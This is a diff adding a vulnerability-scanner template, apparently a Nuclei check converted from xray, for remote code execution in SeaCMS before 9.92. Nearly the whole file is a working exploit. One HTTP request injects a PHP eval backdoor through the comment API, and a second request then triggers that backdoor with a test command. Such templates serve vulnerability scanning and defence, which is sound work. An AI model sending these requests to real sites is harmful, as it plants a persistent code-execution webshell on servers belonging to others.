@@ -1,0 +1,31 @@
+id: poc-yaml-seacms-before-v992-rce
+
+info:
+  name: poc-yaml-seacms-before-v992-rce
+  author: bufsnake(https://github.com/bufsnake)
+  severity: critical
+  tags: xray-converted,rce,ct-158384
+  reference:
+    - https://www.zhihuifly.com/t/topic/3118
+
+http:
+  - raw:
+      - |
+        GET /comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /data/mysqli_error_trace.php?_=printf(md5("{{rand_base(8)}}"))%3B HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
